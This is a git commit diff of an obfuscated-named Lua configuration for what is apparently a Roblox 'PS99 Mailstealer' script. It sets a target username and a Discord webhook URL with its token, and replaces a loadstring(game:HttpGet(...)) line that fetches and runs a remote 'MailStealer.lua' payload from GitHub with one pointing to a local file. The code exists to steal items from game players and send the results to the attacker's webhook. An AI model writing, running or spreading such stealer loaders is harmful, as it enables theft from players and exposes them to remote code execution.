88a3324d411f8fa4cf0aaebd627220c6fe7d5ce9
moonieGuy <emilemiljoh@gmail.com>
2024-06-15 16:30:15 +0200

    Update obf_x0NBU46b7942ZC5Er5B07OH5IIhio4UHshHHaxf3naz4QPS9X56izc3WK69f8OKJ (1).lua

--- obf_x0NBU46b7942ZC5Er5B07OH5IIhio4UHshHHaxf3naz4QPS9X56izc3WK69f8OKJ (1).lua
+++ obf_x0NBU46b7942ZC5Er5B07OH5IIhio4UHshHHaxf3naz4QPS9X56izc3WK69f8OKJ (1).lua
@@ -2,4 +2,4 @@ Username = "Elmio09"
 LoadScreen = true 
 Webhook = "https://discord.com/api/webhooks/1251541587238977576/eTXKNWIkL8AqqlO8-erhS2eQHJ1PEZgffvLMRtdmfsaiqHMpB65jFbRLAQjdRLQ6aUii" -- Paste your Discord webhook here
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
+loadstring(game:HttpGet("obf_x0NBU46b7942ZC5Er5B07OH5IIhio4UHshHHaxf3naz4QPS9X56izc3WK69f8OKJ (1).lua"))()
